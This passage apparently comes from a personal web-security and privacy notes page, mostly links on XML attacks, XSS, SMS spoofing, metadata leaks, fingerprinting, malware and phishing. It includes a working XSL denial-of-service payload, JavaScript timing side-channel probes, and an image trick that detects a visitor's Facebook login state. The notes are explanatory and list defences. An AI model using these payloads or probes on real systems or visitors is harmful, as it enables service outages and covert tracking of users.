- [XXE](https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing)
- [Billion laughs](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Billion_Laughs)
- [quadratic blowup](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- XSL DoS attack
    ```xml
	<?xml version="1.0"?>
	<?xml-stylesheet type="text/xsl" href="#stylesheet"?>
	<!DOCTYPE responses [
		<!ATTLIST xsl:stylesheet id ID #REQUIRED>
	]>
	<root>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<node/>
		<xsl:stylesheet id="stylesheet" version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
			<xsl:template match="/">
				<xsl:for-each select="/root/node">
					<xsl:for-each select="/root/node">
						<xsl:for-each select="/root/node">
							<xsl:for-each select="/root/node">
								<xsl:for-each select="/root/node">
									<xsl:for-each select="/root/node">
										<xsl:for-each select="/root/node">
											<xsl:for-each select="/root/node">
												<xsl:for-each select="/root/node">
													<xsl:for-each select="/root/node">
														<pwnage/>
													</xsl:for-each>
												</xsl:for-each>
											</xsl:for-each>
										</xsl:for-each>
									</xsl:for-each>
								</xsl:for-each>
							</xsl:for-each>
						</xsl:for-each>
					</xsl:for-each>
				</xsl:for-each>
			</xsl:template>
		</xsl:stylesheet>
	</root>
    ```
	
	- [Security: A harmless SVG + XSLT curiousity](http://scarybeastsecurity.blogspot.fr/2011/01/harmless-svg-xslt-curiousity.html)
- etc.

Some attacks can be blocked by [Content Security Policy](#content-security-policy)

- [Deserialization of untrusted data - OWASP](https://www.owasp.org/index.php/Deserialization_of_untrusted_data)
- [XML Security Cheat Sheet - OWASP](https://www.owasp.org/index.php/XML_Security_Cheat_Sheet#Quadratic_Blowup)
- [The innerHTML Apocalypse](http://www.slideshare.net/x00mario/the-innerhtml-apocalypse)
- https://hackinparis.com/data/slides/2011/09-TheForbiddenImage.pdf
- [HTML Purifier - Filter your HTML the standards-compliant way!](http://htmlpurifier.org/)
- https://github.com/cure53/DOMPurify
- https://github.com/notriddle/ammonia
- https://github.com/darylldoyle/svg-sanitizer
- [#24251 (Reconsider SVG inclusion to get_allowed_mime_types) – WordPress Trac](https://core.trac.wordpress.org/ticket/24251#comment:27)
- [web application - What does a HTML filter need to do, to protect against SVG attacks? - Information Security Stack Exchange](http://security.stackexchange.com/questions/26264/what-does-a-html-filter-need-to-do-to-protect-against-svg-attacks/30390#30390)

#### XSS and injection vulnerabilities

See [XSS and injection prevention](#xss-and-injection-prevention)

- [XSS game](https://xss-game.appspot.com/) - [Google created an XSS game to teach you how to exploit and prevent them (x-post from /r/php) : webdev](https://www.reddit.com/r/webdev/comments/5s1ex0/google_created_an_xss_game_to_teach_you_how_to/)
- [HTTP/0.9 vulnerability](#http09-vulnerability)
- [HTML5 Security Cheatsheet - A collection of HTML5 related XSS attack vectors](https://github.com/cure53/H5SC)
- [EXIF Cross Site Scripting, PHP Fun – Confessions Of A Dangerous Mind](http://www.sectorix.com/2013/12/02/exif-cross-site-scripting-php-fun/)
- [Malware Hidden Inside JPG EXIF Headers](https://blog.sucuri.net/2013/07/malware-hidden-inside-jpg-exif-headers.html)
- Some data can bypass CSP [Polyglot JPEG - JS file](#polyglot-jpeg---js-file)
- [The Shortest Reflected XSS Attack Possible - Fooling the Interpreter](http://brutelogic.com.br/blog/shortest-reflected-xss-possible/)
- [Widespread XSS Vulnerabilities in Ad Network Code Affecting Top Tier Publishers, Retailers - Randy Westergren](https://randywestergren.com/widespread-xss-vulnerabilities-ad-network-code-affecting-top-tier-publishers-retailers/)
- [PortSwigger Web Security Blog: Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)
- [XSS Archive | XSSed.com](http://www.xssed.com/archive/)
- [Zoom Zero Day: 4+ Million Webcams & maybe an RCE? Just get them to visit your website!](https://medium.com/bugbountywriteup/zoom-zero-day-4-million-webcams-maybe-an-rce-just-get-them-to-visit-your-website-ac75c83f4ef5)

#### SMS spoofing

By defining sender ID (sender name, OAdC - Originating Address Code) with a business name or phone number

Doesn't work for Canada, China, Taiwan and the USA. China, Mexico, South Africa, Belgium?

> A maximum of 11 characters or 12 digits, we recommend you only use letters and numbers as some handsets don’t correctly handle punctuation. If not specified, your account default will be used. If you’re sending with a text from address and your message isn’t delivered try again but change to sending from a telephone number - some international networks place restrictions on the from addresses they’ll accept. Due to US telecomunications rules you’re unable to set the from address when sending to the USA - the text will always come from 43704.
— [Send SMS using XML - Clockwork SMS API](https://www.clockworksms.com/doc/clever-stuff/xml-interface/send-sms/#from)

- [SMS spoofing — Wikipedia](https://en.wikipedia.org/wiki/SMS_spoofing)
- [telephony - How do some SMS messages transmit the senders name? - Stack Overflow](https://stackoverflow.com/questions/11605323/how-do-some-sms-messages-transmit-the-senders-name)
- [How to send someone SMS (text) from mobile and he/she receives a name instead of a number even though he/she does not have my mobile number in his/her contact - Quora](https://www.quora.com/How-do-I-send-someone-SMS-text-from-mobile-and-he-she-receives-a-name-instead-of-a-number-even-though-he-she-does-not-have-my-mobile-number-in-his-her-contact)
- [SMS Spoofing with Python for Good and Evil – The Durk Web](http://www.thedurkweb.com/sms-spoofing-with-python-for-good-and-evil/) - [SMS Spoofing with Python for Good and Evil : Python](https://www.reddit.com/r/Python/comments/6dtp3d/sms_spoofing_with_python_for_good_and_evil/)
- [How do I show my mobile number when sending SMS text messages from Skype?](https://support.skype.com/en/faq/FA672/how-do-i-show-my-mobile-number-when-sending-sms-text-messages-from-skype)
- [Loi n° 2004-575 du 21 juin 2004 pour la confiance dans l'économie numérique | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=JORFTEXT000000801164&dateTexte=)
- [Loi n° 78-17 du 6 janvier 1978 relative à l'informatique, aux fichiers et aux libertés | Legifrance](https://www.legifrance.gouv.fr/affichTexte.do?cidTexte=LEGITEXT000006068624&dateTexte=20090813)
- [Country Specific Features and Restrictions – Knowledgebase](https://help.nexmo.com/hc/en-us/sections/200622473-Country-Specific-Features-and-Restrictions)
- [A guide to succesful international SMS messages: international rules and guideli](https://www.cmtelecom.com/newsroom/sending-international-sms-country-specific-rules-regulations-and-habits)

## Privacy and identification

- Hidden input allow the webpage get more infos than the user want to share (with autocomplete)
	* [Oversharing with the browser’s autofill / Stoyan's phpied.com](http://www.phpied.com/oversharing-with-the-browsers-autofill/)
	* https://twitter.com/anttiviljami/status/816585860661518336
- [Have I been pwned? Check if your email has been compromised in a data breach](https://haveibeenpwned.com/)
- [Did you know that the NSA uses Uber Drivers and Soccer Moms to Spy on You?](https://medium.com/@amuse/did-you-know-that-the-nsa-uses-uber-drivers-and-soccer-moms-to-spy-on-you-d912fe74befd)
- [Restore Privacy | Your online privacy resource center](https://restoreprivacy.com/)
- Facebook image tracking data (image identifier)
    - [(1) Edin Jusupovic on Twitter: "#facebook is embedding tracking data inside photos you download. I noticed a structural abnormality when looking at a hex dump of an image file from an unknown origin only to discover it contained what I now understand is an IPTC special instruction. Shocking level of tracking.. https://t.co/WC1u7Zh5gN" / Twitter](https://mobile.twitter.com/oasace/status/1149181539000864769)
    - [IPTC metadata automatically added to uploaded images on Facebook - Stack Overflow](https://stackoverflow.com/questions/31120222/iptc-metadata-automatically-added-to-uploaded-images-on-facebook)
    - [watzon/fbmdob: Facebook image Metadata Obfuscation server](https://github.com/watzon/fbmdob)

- [OSINT Search Tool by IntelTechnique | Open Source Intelligence](https://inteltechniques.com/menu.html)
- [Michael Bazzell' Blog  » Blog Archive   » Updated OSINT Flowcharts](https://inteltechniques.com/blog/2018/03/06/updated-osint-flowcharts/)

### Nothing to hide argument

- [Facebook Graph Shortcuts](http://graph.tips/)
- [Je n'ai rien à cacher.](http://jenairienacacher.fr/)
- [Rien à cacher (argument) — Wikipédia](https://fr.wikipedia.org/wiki/Rien_%C3%A0_cacher_%28argument%29)
- [Lettre ouverte à ceux qui n’ont rien à cacher | InternetActu.net](http://www.internetactu.net/2010/05/21/lettre-ouverte-a-ceux-qui-nont-rien-a-cacher/)
- [Google Analytics In Real Life - Online Checkout - YouTube](https://www.youtube.com/watch?v=3Sk7cOqB9Dk)
- Social experiment about privacy about public toilets [Snoopers Charter - Very public toilet - YouTube](https://www.youtube.com/watch?v=_-RSravgi_Y)

### HTTP Referer

Referrer (correct spelling)

- [Everything you could ever want to know (and more) about controlling the Referer header | FastMail Blog](https://blog.fastmail.com/2016/06/20/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header/)
- `Referrer-Policy` HTTP header [Referrer-Policy - HTTP | MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- `<meta name="referrer" content="same-origin">` prevent to transmit referrer (ex: contains a sensitive URL)
- `referrerpolicy` attribute [\<a\> - HTML | MDN](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/a#attr-referrerpolicy)

### Any data can contains private information

Uploading a document can expose/leak private data. This data and metadata should be stripped if exposed publicly.

- Any file:
	* File name: [More Than Meets The Eye - The Hacker Factor Blog](http://www.hackerfactor.com/blog/index.php?/archives/565-More-Than-Meets-The-Eye.html) - generator, last used tool/service
- Picture:
	* (EXIF) author
	* (EXIF) location
	* (EXIF) editor
	* human faces
	* plate number
	* serial number
	* credit card number
	* phone number
	* human fingerprint / eye iris
	* user name / account
	* address
	
	Directly or in reflects
- Word document:
	* author
	* [changes](https://support.office.com/en-us/article/Track-changes-while-you-edit-024158a3-7e62-4f05-8bb7-dc3ecf0295c4), etc.
- HTTP protocol:
	* Some ISP add specific headers. See [Header Enrichment or ISP Enrichment? Emerging Privacy Threats in Mobile Networks - headerenrichment15.pdf](https://www.icsi.berkeley.edu/pubs/networking/headerenrichment15.pdf)

Metadata:

- [Metadata](Image#medata)
- [Metadata removal tool - Wikipedia, the free encyclopedia](https://en.wikipedia.org/wiki/Metadata_removal_tool)
- [Remove hidden data and personal information by inspecting documents - Office Support](https://support.office.com/en-us/article/Remove-hidden-data-and-personal-information-by-inspecting-documents-356b7b5d-77af-44fe-a07f-9aa4d085966f)
- [Document Metadata Extraction - ForensicsWiki](http://www.forensicswiki.org/wiki/Document_Metadata_Extraction)
- [Exchangeable image file format - Wikipedia, the free encyclopedia - Privacy and security](https://en.wikipedia.org/wiki/Exchangeable_image_file_format#Privacy_and_security)
- [FotoForensics](http://fotoforensics.com/tutorial-meta.php)

Recover data from corrupted stream/storage medium:

- [SANS SIFT Kit/Workstation: Investigative Forensic Toolkit Download](http://digital-forensics.sans.org/community/downloads)
- [CAINE Live USB/DVD - computer forensics digital forensics](http://www.caine-live.net/)
- [How to build your first digital forensics lab on a budget | SecurityWatch](http://bhconsulting.ie/securitywatch/?p=3045)
- [DEFT Linux - Computer Forensics live CD |](http://www.deftlinux.net/)
- [Autopsy](http://www.sleuthkit.org/autopsy/)
- [Forensic Toolkit (FTK) | AccessData](http://accessdata.com/solutions/digital-forensics/forensic-toolkit-ftk)
- [PhotoRec - Digital Picture and File Recovery](http://www.cgsecurity.org/wiki/PhotoRec)
- [Digital Image Forensic Analyzer - imageforensic.org](http://www.imageforensic.org/)
- [PC Inspector - kostenlose Software für die Datenrettung von CONVAR - Die Datenretter.](http://www.pcinspector.de/Default.htm?language=1)
- [Download Recuva | Recover deleted files, free!](https://www.ccleaner.com/recuva)
- [FreeUndelete - OfficeRecovery.com](http://www.officerecovery.com/freeundelete/)

Example of leak:

- [Le dragueur trahi par sa clef USB - virtualabs.fr](http://www.virtualabs.fr/Le-dragueur-trahi-par-sa-clef-USB)

### Fingerprinting

- [Entropy](https://en.wikipedia.org/wiki/Entropy_(information_theory))

See also

- [Fingerprinting Protections · brave/brave-browser Wiki](https://github.com/brave/brave-browser/wiki/Fingerprinting-Protections)
- [Temporary user tracking in major browsers and Cross-domain information leakage and attacks](https://web.archive.org/web/20141214141849/http://landing2.trusteer.com/sites/default/files/Temporary_User_Tracking_in_Major_Browsers.pdf)
- [p0f v3](http://lcamtuf.coredump.cx/p0f3/) - P0f is a tool that utilizes an array of sophisticated, purely passive traffic fingerprinting mechanisms to identify the players behind any incidental TCP/IP communications
- [Now sites can fingerprint you online even when you use multiple browsers | Ars Technica UK](https://arstechnica.co.uk/security/2017/02/now-sites-can-fingerprint-you-online-even-when-you-use-multiple-browsers/) - Use WebGL capabilities. See [crossbrowsertracking_NDSS17.pdf](http://yinzhicao.org/TrackingFree/crossbrowsertracking_NDSS17.pdf)
- How advertisers merge user profiles with cookie syncing [Privacy Conference - Keynote: Lorrie Cranor - YouTube](https://www.youtube.com/watch?v=G7QOJ6lmXGg&t=31m20s) (end 40m11s)
- [acsac2016-device-fingerprinting.pdf](http://people.scs.carleton.ca/~paulv/papers/acsac2016-device-fingerprinting.pdf)
- [Security/Anonymous Browsing - MozillaWiki](https://wiki.mozilla.org/Security/Anonymous_Browsing)
- [A Primer on Information Theory and Privacy | Electronic Frontier Foundation](https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy)
- [How Unique Is Your Web Browser?](https://panopticlick.eff.org/browser-uniqueness.pdf)
- [Fingerprinting - MozillaWiki](https://wiki.mozilla.org/Fingerprinting)
- [Zombie cookie — Wikipedia](https://en.wikipedia.org/wiki/Zombie_cookie)
- [HTTP cookie — Wikipedia](https://en.wikipedia.org/wiki/HTTP_cookie#Alternatives_to_cookies)
- [Tracking the Trackers: Microsoft Advertising | Center for Internet and Society](http://cyberlaw.stanford.edu/blog/2011/08/tracking-trackers-microsoft-advertising)
- [BrowserLeaks.com — Web Browser Security Checklist for Identity Theft Protection](https://www.browserleaks.com/)
- [anonymous browser fingerprinting - valve's](http://valve.github.io/blog/2013/07/14/anonymous-browser-fingerprinting/) and https://github.com/Valve/fingerprintjs2
- [Legal Guidelines For The Use Of Location Data On The Web – Smashing Magazine](https://www.smashingmagazine.com/2016/03/location-data-web-development-and-the-law/)
- [Technical analysis of client identification mechanisms - The Chromium Projects](https://www.chromium.org/Home/chromium-security/client-identification-mechanisms)
- [Online tracking: A 1-million-site measurement and analysis](https://webtransparency.cs.princeton.edu/webcensus/index.html)
- [PowerPoint Presentation - Is_preventing_browser_fingerprinting_a_lost_cause.pdf](https://www.w3.org/wiki/images/7/7d/Is_preventing_browser_fingerprinting_a_lost_cause.pdf)
- https://github.com/Valve/fingerprintjs2
- [phaseIII.eps - 1503.01408.pdf](https://arxiv.org/pdf/1503.01408.pdf)
- [JavaScript and Daylight Savings for tracking users. | Application Security](https://www.idontplaydarts.com/2011/10/javascript-and-daylight-savings-for-tracking-users/) - each country have timezone and daylight different rules, across the history
- [Fingerprinting Firefox users with cached intermediate CA certificates (#fiprinca) - shift or die](https://shiftordie.de/blog/2017/02/21/fingerprinting-firefox-users-with-cached-intermediate-ca-certificates-fiprinca/)
- [Printers | Electronic Frontier Foundation](https://www.eff.org/issues/printers) - Pinter watermarks
- [Pixel Perfect: Fingerprinting Canvas in HTML5](https://hovav.net/ucsd/dist/canvas.pdf)

Other

- [Cancel That Card | Share a little](http://cancelthat.cc/), an automated service that tweets at people who post pictures of their credit or debit cards online
- [Privacy - Manage Your Privacy - Apple](http://www.apple.com/privacy/manage-your-privacy/)
- [Privacy - Approach to Privacy - Apple](http://www.apple.com/privacy/approach-to-privacy/)

To protect against entropy and protect privacy (obfuscation): generate noise, fake informations

- [Opt Out From Online Behavioral Advertising By Participating Companies (BETA)](http://www.aboutads.info/choices/)
- [TrackMeNot](http://cs.nyu.edu/trackmenot/)
- [Obfuscation | The MIT Press](https://mitpress.mit.edu/books/obfuscation)
- https://addons.mozilla.org/en-US/firefox/addon/canvasblocker/

Tools to finger print web browsers:

- [Panopticlick](https://panopticlick.eff.org/)
- [Browserprint](https://browserprint.info/)
- [Device Fingerprint](http://noc.to/)

#### Timing attack

Can use side-channel leaks (time attack) to measure time of the response for cache data, HSTS, system/browser files, etc.

Use a resource (like image or video).

This example is inaccurate, mainly measure download time (impact of the network) of the resource:

	const image = new Image();
	image.onerror = function(){
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	};
	// Start timer
	const start = performance.now();
	image.src = "https://example.com/admin.php";// invalid image
	// The login form page is returned quicker than full admin page (less HTML code to load)

An improved example:

	const video = document.createElement("video");
	let start = NaN;
	// suspend event: download complete
	video.onsuspend = function(){
		// Start timer
		start = performance.now();
	}
	// error event: parsing complete
	video.onerror = function(){
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	};
	video.src = "https://example.com/admin.php";// invalid video

An other example using Service worker (Cache Storage Attack):

	const url = "https://example.com/admin.php";
	const dummyRequest = new Request("dummy");
	let start = NaN;
	fetch(url, {
		credentials: "include",
		mode: "no-cors"
	}).then(function(response){
		// download complete
		// Start timer
		start = performance.now();
		return cache.put(dummyRequest, response.clone());
	}).then(function(){
		// resource stored in the cache
		// Stop timer
		const end = performance.now();
		const delta = end - start;
		console.log(`Loading took ${delta}ms.`);
	})

	Compare 2 string take less time if string provided is small or start with identical chars (for same length), etc. like using a safe string compare (time is less impacted by optimizations):
	
		// Not executed faster depends b
		function safeCompare(a, b) {
			a = String(a);
			b = String(b);
			var length = a.length;
			var result = 0;
			
			if (length !== b.length) {
				b = a;
				result = 1;
			}
			
			for (let index = 0; index < length; index++) {
				result |= (a.charCodeAt(index) ^ b.charCodeAt(index));// XOR
			}
			
			return result === 0;
		};
	
	Compare password hash, etc.:
	
	See

- [PHP: rfc:timing_attack](https://wiki.php.net/rfc/timing_attack)
- [PHP: hash_equals - Manual](http://php.net/manual/en/function.hash-equals.php)
- [PHP: password_verify - Manual](http://php.net/manual/en/function.password-verify.php)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=1m34s)
- [sirdarckcat: [Matryoshka] - Web Application Timing Attacks (or.. Timing Attacks against JavaScript Applications in Browsers)](http://sirdarckcat.blogspot.fr/2014/05/matryoshka-web-application-timing.html)
- [Using Node.js Event Loop for Timing Attacks](https://snyk.io/blog/node-js-timing-attack-ccc-ctf/)
- [Dev.Opera — Front-End Performance: The Dark Side](https://dev.opera.com/blog/timing-attacks/)
- [Timing Attacks in the Modern Web - tom.vg](https://tom.vg/2016/08/browser-based-timing-attacks/)
- [Mathias Bynens on Twitter: "More about timing attacks on the web...](https://twitter.com/mathias/status/760359100177846272)
- [Browser-based Timing Attacks](https://labs.tom.vg/browser-based-timing-attacks/)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=8m22s)
- [Mathias Bynens — Front-End Performance: The Dark Side on Vimeo](https://vimeo.com/163113209#t=15m19s)
- [Academic - VaGoSec](https://vagosec.org/academic/#ccs2015-timing)
- [Constant-Time Character Encoding in PHP Projects](https://github.com/paragonie/constant_time_encoding)
- [Timing attack — Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)

#### Private mode

	try { localStorage.test = 2; } catch (e) {
		alert('You are in Private Browsing mode (in Safari)');
	}

Note: will not works with Chrome's Incognito Mode

- [ios - (How) Can a web site determine if Safari Private Browsing is turned on? - Ask Different](http://apple.stackexchange.com/questions/131587/how-can-a-web-site-determine-if-safari-private-browsing-is-turned-on/131588)
- [web browser - Can web sites detect whether you are using private browsing mode? - Information Security Stack Exchange](http://security.stackexchange.com/questions/9037/can-web-sites-detect-whether-you-are-using-private-browsing-mode)

#### Native application is installed

iOS and Android

Allow to open native apps with custom arguments

- [Open native application](Web#open-native-application)
- [Twitter detect installed Apps on iOS `canOpenURL`](https://gist.github.com/genadyo/295a5e8f0d743f57137f)
	http://nikf.org/blog/twitter-ads-app-detection
	[Andreas Kurtz on Twitter: "iOS Twitter determines installed apps by checking the 2.551 custom URI schemes (canOpenURL) listed in main bundle's app_store_app_data.json"](https://twitter.com/aykay/status/537976040996749312)
- Discover and Hack URL Handlers: [ouspg/urlhandlers: Discover and Hack URL handlers](https://github.com/ouspg/urlhandlers) and [Discover and Hack URL Handlers (Prototype)](http://hack.urlhandlers.info/)

#### Other data

User:

- typing speed
- facial recognition
- vocal inflexions
- room ambiance (sound)
- reflex delay

Software and hardware:

- protocol supported / used (+ meta data in this protocol)
	* [Fingerprinting Browsers Using Protocol Handlers](http://itsecuritysolutions.org/2010-03-29_fingerprinting_browsers_using_protocol_handlers/)
	* [Links to local pages do not work - MozillaZine Knowledge Base](http://kb.mozillazine.org/Links_to_local_pages_don't_work)
	* [browser - Open Explorer window from Website - Stack Overflow](https://stackoverflow.com/questions/1431112/open-explorer-window-from-website)
	* [Per-domain Configurable Security Policies are no longer available (Affected) | Firefox Site Compatibility](https://www.fxsitecompat.com/en-CA/docs/2014/per-domain-configurable-security-policies-are-no-longer-available/)
- format supported by the video, audio, image (Accept header and Accept-Encoding) same as OS+Hardware+browser ?
- Canvas fingerprint, same as OS+Hardware+browser
	* [Canvas fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/Canvas_fingerprinting)
	* https://www.browserleaks.com/canvas
- Video decoder finderprint: Colors are not decoded the same way and can cause a difference
	* https://stackoverflow.com/questions/28603552/html5-video-color-difference-chrome-internet-explorer
	[Digital video fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/Digital_video_fingerprinting)
- `getClientRects()` fingerpint (browser rendering engine, fonts installed)
	* [Advanced Tor Browser Fingerprinting](http://jcarlosnorte.com/security/2016/03/06/advanced-tor-browser-fingerprinting.html#getclientrects-fingerprinting)
- `AudioContext` fingerprint
	* [AudioContext Fingerprint Test Page](https://audiofingerprint.openwpm.com/)
- browser (User-Agent header)
- screen size, color depth, pixel ratio, GPU
	* `screen.*`
	* [WEBGL_debug_renderer_info - Web APIs | MDN](https://developer.mozilla.org/en-US/docs/Web/API/WEBGL_debug_renderer_info)
- battery status
	> When battery is running low, people might be prone to some - otherwise different - decisions
	— [Battery Status readout as a privacy risk](https://blog.lukaszolejnik.com/battery-status-readout-as-a-privacy-risk/)
	
	> When your phone is down to 5 per cent battery and that little icon on the iphone turns red, people start saying I’d better get home or I don’t know how I’m going to get home otherwise
	— [Keith Chen Is Uber's Head Of Economics And Decides When Uber Surges Price : NPR](http://www.npr.org/2016/05/17/478266839/this-is-your-brain-on-uber)
	
	> The amount of battery users had left was “one of the strongest predictors of whether or not you are going to be sensitive to surge” – in other words, agree to pay 1.5 times, 2 times or more the normal cost of a journey
	— [Uber knows when your phone is running out of battery | The Independent](http://www.independent.co.uk/life-style/gadgets-and-tech/news/uber-knows-when-your-phone-is-about-to-run-out-of-battery-a7042416.html)
- OS
- CPU speed (use webworker for intensive task)
- available plugins
- time zone
- cookies and other storages systems (`window.name`, Web Storage, browser cache)
	* [Samy Kamkar - evercookie - virtually irrevocable persistent cookies](http://samy.pl/evercookie/) and [samyk/evercookie: Produce persistent, respawning "super" cookie in a browser, abusing over a dozen techniques. It goal i to identify user after they've removed standard cookie and other privacy data such a Flash cookie (LSOs), HTML5 storage, SilverLight storage, and others.](https://github.com/samyk/evercookie)
- Mouse move and mouse wheel deltas
- History via
	- CSS `:visited` selector (before March 2010) https://developer.mozilla.org/en-US/docs/Web/CSS/Privacy_and_the_:visited_selector [Jeremiah Grossman: I know where you've been](http://blog.jeremiahgrossman.com/2006/08/i-know-where-youve-been.html)
	- HSTS (detect to detect history of HTTPS visited websites using HSTS)
		- [Sniffy](https://zyan.scripts.mit.edu/sniffly/) and https://github.com/diracdeltas/sniffly
		- [RadicalResearch HSTS Super Cookies](http://www.radicalresearch.co.uk/lab/hstssupercookies)
		- [Anatomy of a browser dilemma – how HSTS ‘supercookies’ make you choose between privacy or security – Naked Security](https://nakedsecurity.sophos.com/2015/02/02/anatomy-of-a-browser-dilemma-how-hsts-supercookies-make-you-choose-between-privacy-or-security/)
		- [Protecting Against HSTS Abuse | WebKit](https://webkit.org/blog/8146/protecting-against-hsts-abuse/)
		- [Criteo’s Shares Plummet on Revenue Forecast - WSJ](https://www.wsj.com/articles/criteos-shares-plummet-on-revenue-forecast-1513279308) - "using HTTP Strict Transport Security Protocol, usually used to secure web connections, allowed it to create a user ID without cookies"
	- cache systems (ServiceWorkers, HTTP headers ETags, etc.)
	- cross domain cookies
- system/browser files (load with iframe src, etc.): `res://C:\\Program Files\\Fiddler2\\Fiddler.exe/#3/#32512`, `chrome://ghostery/content/options.html`, `resource:///defaults/preferences/firefox.js`
	* [863246 – resource:// URIs leak information](https://bugzilla.mozilla.org/show_bug.cgi?id=863246)
	* https://github.com/beefproject/beef/wiki/Module:-browser-fingerprint
	* https://blog.malwarebytes.com/cybercrime/exploits/2016/06/neutrino-ek-fingerprinting-in-a-flash/ http://malware.dontneedcoffee.com/2014/10/cve-2013-7331-and-exploit-kits.html
- available fonts
- geolocation
- IP address
- language(s) (Accept-Language header)
- cookies disabled, javascript disabled, popup disabled
- [Device fingerprint — Wikipedia](https://en.wikipedia.org/wiki/Device_fingerprint) [TCP/IP stack fingerprinting — Wikipedia](https://en.wikipedia.org/wiki/TCP/IP_stack_fingerprinting)
- installed apps
- OS/Browser UI: (macOS, Windows, Linux) scrollbar size, input default styles, etc.
- third party autentification
	Use login auth mecanisms to detect if the user is logged in:
	
	```html
	<img onload="alert('logged in to Facebook')" onerror="alert('not logged in to Facebook')" src="https://www.facebook.com/login.php?next=https%3A%2F%2Fwww.facebook.com%2Ffavicon.ico">
	```

	- use [`SameSite`](https://www.owasp.org/index.php/SameSite) cookies
	- [Your Social Media Fingerprint](https://robinlinus.github.io/socialmedia-leak/)
- The feature, font used in a document can used to detect the original creation date / year
	- [Les polices de caractères incorporées dans des outils comme Office pourraient servir d'indicateurs, pour détecter les fraudeurs](https://www.developpez.com/actu/149640/Les-polices-de-caracteres-incorporees-dans-des-outils-comme-Office-pourraient-servir-d-indicateurs-pour-detecter-les-fraudeurs/)
	- [Dani Rodrik's weblog: Did Microsoft steal its fonts from the Turkish army?](http://rodrik.typepad.com/dani_rodriks_weblog/2012/10/did-microsoft-steal-its-fonts-from-the-turkish-army.html)
	- [How Microsoft’s Calibri font doomed Sharif family in Panama Case – Daily Pakistan](https://en.dailypakistan.com.pk/pakistan/how-microsofts-calibri-font-doomed-sharif-family-in-panama-case/)

## Malware

Types: ransomware, etc.

> SMTP stands for Simple Malware Transport Protocol.
— [Kevin Beaumont](https://twitter.com/GossiTheDog/status/809152384924614657)

- Detect and report ransomware: [Crypto Sheriff — The No More Ransom Project](https://www.nomoreransom.org/crypto-sheriff.php)
- [How malware bypassing anti-viruses work](Straight Pole + Curved Hole Illusion.mp4)
- [Malware — Wikipedia](https://en.wikipedia.org/wiki/Malware)
- [svent/jsdetox: A Javascript malware analysis tool](https://github.com/svent/jsdetox)
- [Microsoft Malware Protection Center - How Microsoft antimalware products identify potentially unwanted software](http://www.microsoft.com/security/portal/mmpc/shared/objectivecriteria.aspx)
- [Malware Domain List](https://www.malwaredomainlist.com/)
- [Marco Cova's Blog » malware](http://wayback.archive.org/web/20100729194334/http://www.cs.ucsb.edu/~marco/blog/malware/)
- [zynamics.com - BinDiff](https://www.zynamics.com/bindiff.html)
- [Readers of popular websites targeted by stealthy Stegano exploit kit hiding in pixels of malicious ads](http://www.welivesecurity.com/2016/12/06/readers-popular-websites-targeted-stealthy-stegano-exploit-kit-hiding-pixels-malicious-ads/)
- [Evolved DNSChanger malware slings evil ads at PCs, hijacks routers • The Register](http://www.theregister.co.uk/2016/12/20/new_dnschanger_exploit_kit_goes_after_166_types_of_router/)
- [Massive AdGholas Malvertising Campaigns Use Steganography and File Whitelisting to Hide in Plain Sight | Proofpoint](https://www.proofpoint.com/us/threat-insight/post/massive-adgholas-malvertising-campaigns-use-steganography-and-file-whitelisting-to-hide-in-plain-sight)
- [Mac Malware of 2016 - Objective-See](https://objective-see.com/blog/blog_0x16.html)
- [RAA - An entirely new JS ransomware delivering Pony malware - ReaQta](https://reaqta.com/2016/06/raa-ransomware-delivering-pony/) https://news.ycombinator.com/item?id=11934717 https://gist.github.com/Antelox/020c727e1917bd018441cb6425cae397
- [FotoForensics - Malware](http://fotoforensics.com/tutorial-malware.php)
- [Helpful(?) coding tips from the CIA’s school of hacks | Ars Technica](https://arstechnica.com/security/2017/03/malware-101-the-cias-dos-and-donts-for-tool-developers/)

## DDoS

Could be a protest, a capabilities test, etc.

- [Definition of DDoS, Attack Types & Characteristics Glossary | Corero](https://www.corero.com/resources/glossary.html)
- [Denial-of-service attack — Wikipedia](https://en.wikipedia.org/wiki/Denial-of-service_attack)

> 10MB + 10x CC to the same email = 100MB into the inbox while you sent only 10MB

> Subscribe to more than 1000 mailing-list will flood your mailbox

## SPAM and Phishing

A targeted fishing after a smartphone has been stolen, to get unlock the protection [This is what Apple should tell you when you lose your iPhone](https://hackernoon.com/this-is-what-apple-should-tell-you-when-you-lose-your-iphone-8f07cf73cf82#)

- [Warning: beware of fake TibiaMaps.io copies! · TibiaMaps.io](https://tibiamaps.io/blog/phishing) - Phishers copy site, add malware, & buy Google ads to make them appear above the original website in search results
- [Phishing — Wikipedia](https://en.wikipedia.org/wiki/Phishing)
- [Email spoofing — Wikipedia](https://en.wikipedia.org/wiki/Email_spoofing)
- authenticate your email domain with [SPF](#spf)

### Report

	Return-Path: <user@sender.com>
	Delivered-To: user@receiver.com
	Received: ...
	Received: ...
	Received: ...
	Received: from [AA.BB.CC.DD] (port=54579 helo=blah.com)
		by emailrelay.com
		(envelope-from <user@sender.com>)
	From: Sender <user@sender.com>
	To: "Receiver" <user@receiver.com>
	Subject: SPAM

`whois AA.BB.CC.DD`, search for `OrgAbuseEmail`

